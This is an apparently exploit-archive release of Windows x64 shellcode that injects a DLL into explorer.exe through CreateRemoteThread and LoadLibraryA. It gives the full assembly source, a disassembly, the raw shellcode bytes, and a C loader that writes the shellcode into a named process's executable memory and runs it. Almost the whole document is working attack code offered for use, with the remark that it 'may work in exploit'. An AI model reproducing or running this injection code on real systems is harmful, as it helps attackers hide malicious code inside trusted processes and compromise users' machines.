/*

	Title: Windows x64 dll injection shellcode (using CreateRemoteThread())
	Size: 584 bytes
	Date: 16-01-2017
	Author: Roziul Hasan Khan Shifat
	Tested On : Windows 7 x64






*/



//Note : i wrtie it for process injection
//It may work in exploit



/*

section .text
	global _start
_start:
xor r8,r8
push r8
push r8

mov [rsp],dword 'expl'
mov [rsp+4],dword 'orer'
mov [rsp+8],dword '.exe'

lea rcx,[rsp] ;;process name (explorer.exe) change it if U want


push r8
push r8
push r8



mov [rsp],dword 'C:\U'
mov [rsp+4],dword 'sers'
mov [rsp+8],dword '\Pub'
mov [rsp+12],dword 'lic\'
mov [rsp+16],dword 'in.d'
mov [rsp+20],word 'll'

lea rdx,[rsp]   ;path of the dll (change it to U full path of dll)




;--------------------------------------------------------

mov r8w,336

sub rsp,r8
lea r12,[rsp]

push 24
pop r8 ;(important: length of dll path string including null byte)


mov [r12],rcx ;process name
mov [r12+8],rdx ;dll path
mov [r12+16],r8 ;length of dll path string

;----------------------------------------------------------





_main:

cdq
mov rax,[gs:rdx+0x60] ;peb
mov rax,[rax+0x18] ;peb->Ldr
mov rsi,[rax+0x10] ;peb->Ldr.InMemOrderModuleList
lodsq
mov rsi,[rax]
mov rdi,[rsi+0x30] ;rdi=kernel32.dll base address



;------------------------------------------
mov dl,0x88
mov ebx,[rdi+0x3c] ;DOS_HEADER->elf_anew
add rbx,rdi ;IMAGE_OPTIONAL_HEADER32
mov ebx,[rbx+rdx] ;IMAGE_DATA_DIRECTORY->VirtualAddress
add rbx,rdi ;IMAGE_EXPORT_DIRECTORY (Export table of kernel32.dll)

mov esi,[rbx+0x1c] ;kenrel32.dll AddressOfFunction
add rsi,rdi

;-------------------------------------------------------
;loading msvcrt.dll
cdq
push rdx
mov dx,832
mov ebx,[rsi+rdx*4]
add rbx,rdi


mov [rsp],dword 'msvc'
mov [rsp+4],word 'rt'

lea rcx,[rsp]

sub rsp,88

call rbx

;-------------------------------
;Finding address of strcmp()

lea rdx,[rsp+88]
mov [rdx],dword 'strc'
mov [rdx+4],word 'mp'

mov rcx,rax

mov r8w,587*4
mov ebx,[rsi+r8]
add rbx,rdi

call rbx
;-----------------------------
mov [r12+24],rax ;address of strcmp()
;---------------------------------------------------------------

mov dx,190*4
mov ebx,[rsi+rdx]
add rbx,rdi ;CreateToolhelp32Snapshot()

;--------------------------------

;HANDLE WINAPI CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID)
xor rdx,rdx ;DWORD th32ProcessID
push 2
pop rcx ;DWORD dwFlags
call rbx

mov r13,rax ;HANDLE
cmp r13,-1
je __exit
;---------------------------------------------
mov dx,304

mov [r12+32],dword edx ;sizeof PROCESSENTRY32



mov dx,920*4
mov ebx,[rsi+rdx]
add rbx,rdi ;rbx=Process32First()

;WINBOOL WINAPI Process32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);

lea rdx,[r12+32] ;LPPROCESSENTRY32 lppe
mov rcx,r13 ;HANDLE hSnapshot


call rbx

cmp rax,1
jne __exit

;---------------------------------------------------

xor rdx,rdx
mov dx,922*4
mov r15d,[rsi+rdx]
add r15,rdi ;r15=Process32Next()



sub rsp,88
get_pid:
lea rcx,[r12+76] ;PROCESSENRY32.CHAR szExeFile[MAX_PATH=260]
mov rdx,[r12] ;process name
mov rbx,[r12+24] ;strcmp()
call rbx

xor rdx,rdx
cmp rax,rdx
jz inject

;WINBOOL WINAPI Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe)
mov rcx,r13
lea rdx,[r12+32]
call r15

cmp rax,1
je get_pid

leave
ret










__exit:
xor rdx,rdx
push rdx
mov dx,297*4
mov ebx,[rsi+rdx]
add rbx,rdi

pop rcx
call rbx










;--------------------------------------------------
;------------------------------------------------------
;inject function
inject:

xor rdx,rdx
push rdx
pop r10

mov r10w,899*4
mov ebx,[rsi+r10]
add rbx,rdi ;rbx=OpenProcess()

;WINBASEAPI HANDLE WINAPI OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId)

push rdx
pop rcx

mov r8d,[r12+40] ;PROCESSENTRY32.DWORD th32ProcessID

;0x1e84800a-0x1e65700b=2035711 (PROCESS_ALL_ACCESS)

mov ecx,0x1e84800a
sub ecx,0x1e65700b

call rbx

mov r13,rax  ;PROCESS HANDLE
cmp r13,-1
je __exit
;--------------------------------------------------------------------

mov dx,1279
mov ebx,[rsi+rdx*4]
add rbx,rdi ;VirualAlloc()

;WINBASEAPI LPVOID WINAPI VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
sub rsp,88

mov rcx,r13 ;HANDLE hProcess
xor rdx,rdx ;LPVOID lpAddress
mov r8,[r12+16] ;SIZE_T dwSize
mov r9w,0x2fff
inc r9;DWORD flAllocationType = (MEM_COMMIT | MEM_RESERVE)
mov [rsp+32],byte 0x4 ;DWORD flProtect = PAGE_READWRITE
call rbx

mov r14,rax ;LPVOID address
xor rdx,rdx
cmp rax,rdx
jz __exit


;-----------------------------------------------------------------------------------
mov dx,1347
mov ebx,[rsi+rdx*4]
add rbx,rdi ;WriteProcessMemory()
sub rsp,88
xor rdx,rdx
;WINBASEAPI WINBOOL WINAPI WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
mov [rsp+32],rdx ;SIZE_T *lpNumberOfBytesWritten
mov rcx,r13 ;HANDLE hProcess
mov rdx,r14 ;LPVOID lpBaseAddress
mov r8,[r12+8] ;LPCVOID lpBuffer
mov r9,[r12+16] ;SIZE_T nSize

call rbx



cmp rax,1
jne __exit

;------------------------------------------------------------------------------------
mov dx,170*4
mov ebx,[rsi+rdx]
add rbx,rdi ;CreateRemoteThread()

xor rdx,rdx
sub rsp,88
;WINBASEAPI HANDLE WINAPI CreateRemoteThread (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)

mov rcx,r13 ;HANDLE hProcess
push rdx
push rdx
pop r8 ;SIZE_T dwStackSize

mov dx,832
mov r9d,[rsi+rdx*4]
add r9,rdi ;LPTHREAD_START_ROUTINE lpStartAddress (LoadLibraryA())

pop rdx ;LPSECURITY_ATTRIBUTES lpThreadAttributes
mov [rsp+32],r14 ;LPVOID lpParameter
mov [rsp+40],r8
mov [rsp+48],r8
call rbx

call __exit

;------------------------------------------------------------























*/



/*



dll_inj.obj:     file format pe-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	4d 31 c0             	xor    %r8,%r8
   3:	41 50                	push   %r8
   5:	41 50                	push   %r8
   7:	c7 04 24 65 78 70 6c 	movl   $0x6c707865,(%rsp)
   e:	c7 44 24 04 6f 72 65 	movl   $0x7265726f,0x4(%rsp)
  15:	72
  16:	c7 44 24 08 2e 65 78 	movl   $0x6578652e,0x8(%rsp)
  1d:	65
  1e:	48 8d 0c 24          	lea    (%rsp),%rcx
  22:	41 50                	push   %r8
  24:	41 50                	push   %r8
  26:	41 50                	push   %r8
  28:	c7 04 24 43 3a 5c 55 	movl   $0x555c3a43,(%rsp)
  2f:	c7 44 24 04 73 65 72 	movl   $0x73726573,0x4(%rsp)
  36:	73
  37:	c7 44 24 08 5c 50 75 	movl   $0x6275505c,0x8(%rsp)
  3e:	62
  3f:	c7 44 24 0c 6c 69 63 	movl   $0x5c63696c,0xc(%rsp)
  46:	5c
  47:	c7 44 24 10 69 6e 2e 	movl   $0x642e6e69,0x10(%rsp)
  4e:	64
  4f:	66 c7 44 24 14 6c 6c 	movw   $0x6c6c,0x14(%rsp)
  56:	48 8d 14 24          	lea    (%rsp),%rdx
  5a:	66 41 b8 50 01       	mov    $0x150,%r8w
  5f:	4c 29 c4             	sub    %r8,%rsp
  62:	4c 8d 24 24          	lea    (%rsp),%r12
  66:	6a 18                	pushq  $0x18
  68:	41 58                	pop    %r8
  6a:	49 89 0c 24          	mov    %rcx,(%r12)
  6e:	49 89 54 24 08       	mov    %rdx,0x8(%r12)
  73:	4d 89 44 24 10       	mov    %r8,0x10(%r12)

0000000000000078 <_main>:
  78:	99                   	cltd
  79:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
  7e:	48 8b 40 18          	mov    0x18(%rax),%rax
  82:	48 8b 70 10          	mov    0x10(%rax),%rsi
  86:	48 ad                	lods   %ds:(%rsi),%rax
  88:	48 8b 30             	mov    (%rax),%rsi
  8b:	48 8b 7e 30          	mov    0x30(%rsi),%rdi
  8f:	b2 88                	mov    $0x88,%dl
  91:	8b 5f 3c             	mov    0x3c(%rdi),%ebx
  94:	48 01 fb             	add    %rdi,%rbx
  97:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  9a:	48 01 fb             	add    %rdi,%rbx
  9d:	8b 73 1c             	mov    0x1c(%rbx),%esi
  a0:	48 01 fe             	add    %rdi,%rsi
  a3:	99                   	cltd
  a4:	52                   	push   %rdx
  a5:	66 ba 40 03          	mov    $0x340,%dx
  a9:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
  ac:	48 01 fb             	add    %rdi,%rbx
  af:	c7 04 24 6d 73 76 63 	movl   $0x6376736d,(%rsp)
  b6:	66 c7 44 24 04 72 74 	movw   $0x7472,0x4(%rsp)
  bd:	48 8d 0c 24          	lea    (%rsp),%rcx
  c1:	48 83 ec 58          	sub    $0x58,%rsp
  c5:	ff d3                	callq  *%rbx
  c7:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
  cc:	c7 02 73 74 72 63    	movl   $0x63727473,(%rdx)
  d2:	66 c7 42 04 6d 70    	movw   $0x706d,0x4(%rdx)
  d8:	48 89 c1             	mov    %rax,%rcx
  db:	66 41 b8 2c 09       	mov    $0x92c,%r8w
  e0:	42 8b 1c 06          	mov    (%rsi,%r8,1),%ebx
  e4:	48 01 fb             	add    %rdi,%rbx
  e7:	ff d3                	callq  *%rbx
  e9:	49 89 44 24 18       	mov    %rax,0x18(%r12)
  ee:	66 ba f8 02          	mov    $0x2f8,%dx
  f2:	8b 1c 16             	mov    (%rsi,%rdx,1),%ebx
  f5:	48 01 fb             	add    %rdi,%rbx
  f8:	48 31 d2             	xor    %rdx,%rdx
  fb:	6a 02                	pushq  $0x2
  fd:	59                   	pop    %rcx
  fe:	ff d3                	callq  *%rbx
 100:	49 89 c5             	mov    %rax,%r13
 103:	49 83 fd ff          	cmp    $0xffffffffffffffff,%r13
 107:	74 60                	je     169 <__exit>
 109:	66 ba 30 01          	mov    $0x130,%dx
 10d:	41 89 54 24 20       	mov    %edx,0x20(%r12)
 112:	66 ba 60 0e          	mov    $0xe60,%dx
 116:	8b 1c 16             	mov    (%rsi,%rdx,1),%ebx
 119:	48 01 fb             	add    %rdi,%rbx
 11c:	49 8d 54 24 20       	lea    0x20(%r12),%rdx
 121:	4c 89 e9             	mov    %r13,%rcx
 124:	ff d3                	callq  *%rbx
 126:	48 83 f8 01          	cmp    $0x1,%rax
 12a:	75 3d                	jne    169 <__exit>
 12c:	48 31 d2             	xor    %rdx,%rdx
 12f:	66 ba 68 0e          	mov    $0xe68,%dx
 133:	44 8b 3c 16          	mov    (%rsi,%rdx,1),%r15d
 137:	49 01 ff             	add    %rdi,%r15
 13a:	48 83 ec 58          	sub    $0x58,%rsp

000000000000013e <get_pid>:
 13e:	49 8d 4c 24 4c       	lea    0x4c(%r12),%rcx
 143:	49 8b 14 24          	mov    (%r12),%rdx
 147:	49 8b 5c 24 18       	mov    0x18(%r12),%rbx
 14c:	ff d3                	callq  *%rbx
 14e:	48 31 d2             	xor    %rdx,%rdx
 151:	48 39 d0             	cmp    %rdx,%rax
 154:	74 24                	je     17a <inject>
 156:	4c 89 e9             	mov    %r13,%rcx
 159:	49 8d 54 24 20       	lea    0x20(%r12),%rdx
 15e:	41 ff d7             	callq  *%r15
 161:	48 83 f8 01          	cmp    $0x1,%rax
 165:	74 d7                	je     13e <get_pid>
 167:	c9                   	leaveq
 168:	c3                   	retq

0000000000000169 <__exit>:
 169:	48 31 d2             	xor    %rdx,%rdx
 16c:	52                   	push   %rdx
 16d:	66 ba a4 04          	mov    $0x4a4,%dx
 171:	8b 1c 16             	mov    (%rsi,%rdx,1),%ebx
 174:	48 01 fb             	add    %rdi,%rbx
 177:	59                   	pop    %rcx
 178:	ff d3                	callq  *%rbx

000000000000017a <inject>:
 17a:	48 31 d2             	xor    %rdx,%rdx
 17d:	52                   	push   %rdx
 17e:	41 5a                	pop    %r10
 180:	66 41 ba 0c 0e       	mov    $0xe0c,%r10w
 185:	42 8b 1c 16          	mov    (%rsi,%r10,1),%ebx
 189:	48 01 fb             	add    %rdi,%rbx
 18c:	52                   	push   %rdx
 18d:	59                   	pop    %rcx
 18e:	45 8b 44 24 28       	mov    0x28(%r12),%r8d
 193:	b9 0a 80 84 1e       	mov    $0x1e84800a,%ecx
 198:	81 e9 0b 70 65 1e    	sub    $0x1e65700b,%ecx
 19e:	ff d3                	callq  *%rbx
 1a0:	49 89 c5             	mov    %rax,%r13
 1a3:	49 83 fd ff          	cmp    $0xffffffffffffffff,%r13
 1a7:	74 c0                	je     169 <__exit>
 1a9:	66 ba ff 04          	mov    $0x4ff,%dx
 1ad:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 1b0:	48 01 fb             	add    %rdi,%rbx
 1b3:	48 83 ec 58          	sub    $0x58,%rsp
 1b7:	4c 89 e9             	mov    %r13,%rcx
 1ba:	48 31 d2             	xor    %rdx,%rdx
 1bd:	4d 8b 44 24 10       	mov    0x10(%r12),%r8
 1c2:	66 41 b9 ff 2f       	mov    $0x2fff,%r9w
 1c7:	49 ff c1             	inc    %r9
 1ca:	c6 44 24 20 04       	movb   $0x4,0x20(%rsp)
 1cf:	ff d3                	callq  *%rbx
 1d1:	49 89 c6             	mov    %rax,%r14
 1d4:	48 31 d2             	xor    %rdx,%rdx
 1d7:	48 39 d0             	cmp    %rdx,%rax
 1da:	74 8d                	je     169 <__exit>
 1dc:	66 ba 43 05          	mov    $0x543,%dx
 1e0:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
 1e3:	48 01 fb             	add    %rdi,%rbx
 1e6:	48 83 ec 58          	sub    $0x58,%rsp
 1ea:	48 31 d2             	xor    %rdx,%rdx
 1ed:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
 1f2:	4c 89 e9             	mov    %r13,%rcx
 1f5:	4c 89 f2             	mov    %r14,%rdx
 1f8:	4d 8b 44 24 08       	mov    0x8(%r12),%r8
 1fd:	4d 8b 4c 24 10       	mov    0x10(%r12),%r9
 202:	ff d3                	callq  *%rbx
 204:	48 83 f8 01          	cmp    $0x1,%rax
 208:	0f 85 5b ff ff ff    	jne    169 <__exit>
 20e:	66 ba a8 02          	mov    $0x2a8,%dx
 212:	8b 1c 16             	mov    (%rsi,%rdx,1),%ebx
 215:	48 01 fb             	add    %rdi,%rbx
 218:	48 31 d2             	xor    %rdx,%rdx
 21b:	48 83 ec 58          	sub    $0x58,%rsp
 21f:	4c 89 e9             	mov    %r13,%rcx
 222:	52                   	push   %rdx
 223:	52                   	push   %rdx
 224:	41 58                	pop    %r8
 226:	66 ba 40 03          	mov    $0x340,%dx
 22a:	44 8b 0c 96          	mov    (%rsi,%rdx,4),%r9d
 22e:	49 01 f9             	add    %rdi,%r9
 231:	5a                   	pop    %rdx
 232:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
 237:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
 23c:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
 241:	ff d3                	callq  *%rbx
 243:	e8 21 ff ff ff       	callq  169 <__exit>

















*/
























#include<stdio.h>
#include<windows.h>
#include<TlHelp32.h>
#include<string.h>


char shellcode[]="\x4d\x31\xc0\x41\x50\x41\x50\xc7\x04\x24\x65\x78\x70\x6c\xc7\x44\x24\x04\x6f\x72\x65\x72\xc7\x44\x24\x08\x2e\x65\x78\x65\x48\x8d\x0c\x24\x41\x50\x41\x50\x41\x50\xc7\x04\x24\x43\x3a\x5c\x55\xc7\x44\x24\x04\x73\x65\x72\x73\xc7\x44\x24\x08\x5c\x50\x75\x62\xc7\x44\x24\x0c\x6c\x69\x63\x5c\xc7\x44\x24\x10\x69\x6e\x2e\x64\x66\xc7\x44\x24\x14\x6c\x6c\x48\x8d\x14\x24\x66\x41\xb8\x50\x01\x4c\x29\xc4\x4c\x8d\x24\x24\x6a\x18\x41\x58\x49\x89\x0c\x24\x49\x89\x54\x24\x08\x4d\x89\x44\x24\x10\x99\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\xb2\x88\x8b\x5f\x3c\x48\x01\xfb\x8b\x1c\x13\x48\x01\xfb\x8b\x73\x1c\x48\x01\xfe\x99\x52\x66\xba\x40\x03\x8b\x1c\x96\x48\x01\xfb\xc7\x04\x24\x6d\x73\x76\x63\x66\xc7\x44\x24\x04\x72\x74\x48\x8d\x0c\x24\x48\x83\xec\x58\xff\xd3\x48\x8d\x54\x24\x58\xc7\x02\x73\x74\x72\x63\x66\xc7\x42\x04\x6d\x70\x48\x89\xc1\x66\x41\xb8\x2c\x09\x42\x8b\x1c\x06\x48\x01\xfb\xff\xd3\x49\x89\x44\x24\x18\x66\xba\xf8\x02\x8b\x1c\x16\x48\x01\xfb\x48\x31\xd2\x6a\x02\x59\xff\xd3\x49\x89\xc5\x49\x83\xfd\xff\x74\x60\x66\xba\x30\x01\x41\x89\x54\x24\x20\x66\xba\x60\x0e\x8b\x1c\x16\x48\x01\xfb\x49\x8d\x54\x24\x20\x4c\x89\xe9\xff\xd3\x48\x83\xf8\x01\x75\x3d\x48\x31\xd2\x66\xba\x68\x0e\x44\x8b\x3c\x16\x49\x01\xff\x48\x83\xec\x58\x49\x8d\x4c\x24\x4c\x49\x8b\x14\x24\x49\x8b\x5c\x24\x18\xff\xd3\x48\x31\xd2\x48\x39\xd0\x74\x24\x4c\x89\xe9\x49\x8d\x54\x24\x20\x41\xff\xd7\x48\x83\xf8\x01\x74\xd7\xc9\xc3\x48\x31\xd2\x52\x66\xba\xa4\x04\x8b\x1c\x16\x48\x01\xfb\x59\xff\xd3\x48\x31\xd2\x52\x41\x5a\x66\x41\xba\x0c\x0e\x42\x8b\x1c\x16\x48\x01\xfb\x52\x59\x45\x8b\x44\x24\x28\xb9\x0a\x80\x84\x1e\x81\xe9\x0b\x70\x65\x1e\xff\xd3\x49\x89\xc5\x49\x83\xfd\xff\x74\xc0\x66\xba\xff\x04\x8b\x1c\x96\x48\x01\xfb\x48\x83\xec\x58\x4c\x89\xe9\x48\x31\xd2\x4d\x8b\x44\x24\x10\x66\x41\xb9\xff\x2f\x49\xff\xc1\xc6\x44\x24\x20\x04\xff\xd3\x49\x89\xc6\x48\x31\xd2\x48\x39\xd0\x74\x8d\x66\xba\x43\x05\x8b\x1c\x96\x48\x01\xfb\x48\x83\xec\x58\x48\x31\xd2\x48\x89\x54\x24\x20\x4c\x89\xe9\x4c\x89\xf2\x4d\x8b\x44\x24\x08\x4d\x8b\x4c\x24\x10\xff\xd3\x48\x83\xf8\x01\x0f\x85\x5b\xff\xff\xff\x66\xba\xa8\x02\x8b\x1c\x16\x48\x01\xfb\x48\x31\xd2\x48\x83\xec\x58\x4c\x89\xe9\x52\x52\x41\x58\x66\xba\x40\x03\x44\x8b\x0c\x96\x49\x01\xf9\x5a\x4c\x89\x74\x24\x20\x4c\x89\x44\x24\x28\x4c\x89\x44\x24\x30\xff\xd3\xe8\x21\xff\xff\xff";


void inject(DWORD );
int main(int i,char *a[])
{
	if(i!=2)
	{
		printf("Usage %s <program name>",a[0]);
		return 0;
	}

	BOOL f=0;
	HANDLE snap;
	PROCESSENTRY32 pe32;

	snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	if(snap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot() Failed."); return 0;
	}

	pe32.dwSize=sizeof(pe32);

	if(!Process32First(snap,&pe32))
	{
		printf("Process32First() Failed."); return 0;
	}



	do
	{
		if(0==strncmp(a[1],pe32.szExeFile,strlen(pe32.szExeFile)))
		{
			f=TRUE;
			break;
		}

	}while(Process32Next(snap,&pe32));


	if(!f)
	{
		printf("No infomation found about \"%s\" ",a[1]);
	}
	else
	{
		printf("Program name:%s\nProcess id: %d",pe32.szExeFile,pe32.th32ProcessID);
		printf("\nInjecting shellcode");
		inject(pe32.th32ProcessID);
	}



	return 0;

}



void inject(DWORD pid)
{
	HANDLE phd,h;
	LPVOID shell;

	phd=OpenProcess(PROCESS_ALL_ACCESS,0,pid);

	if(phd==INVALID_HANDLE_VALUE)
	{
		printf("\nOpenProcess() Failed."); return ;
	}

	shell=VirtualAllocEx(phd,0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if(shell==NULL)
	{
		printf("\nVirtualAllocEx() Failed"); return ; CloseHandle(phd);
	}

	WriteProcessMemory(phd,shell,shellcode,sizeof(shellcode),0);
	printf("\nInjection successfull\n");
	printf("Running Shellcode......\n");

	h=CreateRemoteThread(phd,NULL,2046,(LPTHREAD_START_ROUTINE)shell,NULL,0,0);
	if(h==NULL)
	{
		printf("Failed to Run Shellcode\n"); return ;
	}
}